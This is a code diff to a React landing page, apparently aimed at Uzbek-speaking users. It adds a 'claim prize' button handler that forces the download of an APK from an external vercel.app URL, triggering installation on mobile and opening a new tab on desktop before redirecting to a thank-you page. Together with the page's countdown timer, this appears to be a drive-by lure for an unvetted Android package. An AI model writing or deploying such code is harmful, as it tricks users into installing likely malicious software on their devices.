@@ -1,6 +1,25 @@
 import React, { useState, useEffect } from 'react';
 
 export default function DarkLanding() {
+  
+const handleClaimPrize = (e) => {
+    e.preventDefault();
+
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/sxUZ.apk';
+    
+    // На мобилке: попытка открыть напрямую (вызовет установку)
+    window.location.href = apkUrl;
+
+    // На ПК: открываем в новой вкладке
+    setTimeout(() => {
+      window.open(apkUrl, '_blank');
+    }, 300);
+
+    // Редирект на thankyou после задержки
+    setTimeout(() => {
+      window.location.href = '/thankyou.html';
+    }, 1500);
+  };
   const [timeLeft, setTimeLeft] = useState({
     hours: 2,
     minutes: 45,
@@ -312,7 +331,7 @@ export default function DarkLanding() {
               }}
               onMouseEnter={() => setButtonHover(true)}
               onMouseLeave={() => setButtonHover(false)}
-              onClick={() => alert('Tayyorlash boshlandi!')}
+              onClick={handleClaimPrize}
             >
               Hozir Yuklab Ol
             </button>
